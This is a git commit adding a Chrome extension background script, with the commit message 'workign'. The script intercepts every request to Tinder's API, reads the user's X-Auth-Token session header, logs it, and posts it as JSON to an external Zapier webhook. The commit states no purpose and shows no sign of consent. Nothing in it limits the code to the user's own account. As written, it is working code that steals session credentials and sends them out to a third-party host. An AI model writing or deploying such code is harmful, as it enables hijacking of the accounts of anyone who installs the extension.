588b1795c69136f31234d67b322cf0e2b3398fe6
Hugh A. Miles <hugh@Hughs-MacBook-Pro.local>
2020-04-18 17:33:49 -0400

    workign

---
+++ background.js
@@ -0,0 +1,29 @@
+// Grabbing 'X-Auth-Token' from user before making
+// request to https://api.gotinder.com/
+chrome.webRequest.onBeforeSendHeaders.addListener(
+  function(details) {
+    details.requestHeaders.map(header => {
+      if(header.name === 'X-Auth-Token') {
+        console.log(header.value)
+        // Push to webhook
+        // 
+        const data = { token: header.value };
+        fetch('https://hooks.zapier.com/hooks/catch/7281121/o59asee/', {
+          method: 'POST', // or 'PUT'
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        })
+        .then((response) => response.json())
+        .then((data) => {
+          console.log('Success:', data);
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+        });
+      }
+    })
+  },
+  {urls: ['https://api.gotinder.com/*']},
+  ["blocking", "requestHeaders"]);
